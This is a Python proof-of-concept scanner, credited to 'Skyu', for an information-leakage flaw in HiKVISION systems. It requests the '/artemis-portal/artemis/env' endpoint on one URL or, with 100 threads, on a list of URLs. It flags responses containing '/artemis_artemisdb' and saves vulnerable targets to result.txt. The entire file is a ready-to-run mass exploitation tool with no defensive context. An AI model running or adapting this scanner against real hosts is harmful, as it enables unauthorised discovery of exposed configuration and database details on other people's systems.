import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    banner = """
                                                              
         ______   ____    ____  _____      _____  ____   ____ 
     ___|\     \ |    |  |    ||\    \    /    /||    | |    |
    |    |\     \|    |  |    || \    \  /    / ||    | |    |
    |    |/____/||    | /    //|  \____\/    /  /|    | |    |
 ___|    \|   | ||    |/ _ _//  \ |    /    /  / |    | |    |
|    \    \___|/ |    |\    \'   \|___/    /  /  |    | |    |
|    |\     \    |    | \    \       /    /  /   |    | |    |
|\ ___\|_____|   |____|  \____\     /____/  /    |\___\_|____|
| |    |     |   |    |   |    |   |`    | /     | |    |    |
 \|____|_____|   |____|   |____|   |_____|/       \|____|____|
    \(    )/       \(       )/        )/             \(   )/  
     '    '         '       '         '               '   '   
                                              author:Skyu

    """
    print(banner)

def main():
    banner()
    parser = argparse.ArgumentParser(description="HiKVISION Information leakage")
    parser.add_argument('-u','--url',help='input url')
    parser.add_argument('-f','--file',help='input url file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(print(f"Usag:\n\t python3 {sys.argv[0]} -h"))
    


def poc(target):
    url = target+'/artemis-portal/artemis/env'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36'
    }
    try:
        res = requests.get(url=url,headers=headers,timeout=5,verify=False).text
        if '/artemis_artemisdb' in res:
            print(f'[+]该网站存在信息泄露，url为{target}')
            with open('result.txt','a') as f:
                f.write(target+'\n')
        else:
            print(f'[-]该网站不存在信息泄露，url为{target}')
    except:
        print(f'[*]{target} is server error')

if __name__ == '__main__':
    main()